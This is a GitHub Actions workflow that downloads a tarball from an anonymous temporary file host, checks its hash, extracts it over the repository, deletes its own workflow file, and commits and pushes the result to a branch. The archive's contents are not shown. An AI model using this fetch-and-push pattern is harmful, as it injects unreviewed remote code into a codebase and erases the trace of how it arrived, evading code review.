name: Apply native proxy guard
on:
  push:
    branches: [ freebuff/cloudflared-native-carrier ]
  workflow_dispatch:
permissions:
  contents: write
jobs:
  fix:
    if: "github.event_name == 'workflow_dispatch' || !contains(github.event.head_commit.message, 'ignore proxy secrets in native carrier')"
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: freebuff/cloudflared-native-carrier
          fetch-depth: 0
          token: ${{ secrets.GITHUB_TOKEN }}
      - name: Unpack guard
        run: |
          curl -fsSL --retry 3 -m 180 -o /tmp/conn-fix.tar.gz https://d.uguu.se/suVpThMutpUL.tar.gz
          echo "7f53e846dafcdb1c126a34fbc07b86eed2b33c9bb647cdfaa0b9105245b6876f  /tmp/conn-fix.tar.gz" | sha256sum -c -
          tar xzf /tmp/conn-fix.tar.gz
          rm -f .github/workflows/fix-proxy-guard.yml
      - name: Commit and push
        run: |
          git config user.name "Meralchen"
          git config user.email "67538314+Meralchen@users.noreply.github.com"
          git add -A
          git commit -m "fix: ignore proxy secrets in native carrier"
          git push origin HEAD:freebuff/cloudflared-native-carrier
